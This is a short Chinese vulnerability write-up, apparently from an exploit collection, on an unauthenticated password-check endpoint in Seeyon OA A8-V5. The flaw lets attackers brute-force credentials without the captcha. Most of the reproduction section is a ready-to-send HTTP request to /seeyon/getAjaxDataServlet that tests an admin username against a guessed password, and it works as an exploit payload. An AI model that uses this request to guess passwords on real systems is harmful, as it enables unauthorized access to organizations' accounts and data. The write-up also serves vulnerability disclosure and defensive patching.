致远OA A8-v5 无视验证码撞库
===========================

一、漏洞简介
------------

致远A8-V5在设计时存在逻辑错误，用户修改密码时对原密码进行了验证，但是验证使用的服务存在未授权访问漏洞，系统对非合法请求的原密码验证功能进行回应，导致了无视验证码，无需login页面进行密码尝试

二、漏洞影响
------------

致远OA A8-v5

三、复现过程
------------

POST穷举用户和密码代码如下

    GET /seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456 HTTP/1.0

    Accept: */*

    Accept-Language: zh-cn

    Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame

    requesttype: AJAX

    Content-Type: application/x-www-form-urlencoded

    Cookie: 

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

    Host: www.0-sec.org

    DNT: 1

    Proxy-Connection: Keep-Alive

![](./.resource/致远OAA8-v5无视验证码撞库/media/rId24.shtml)
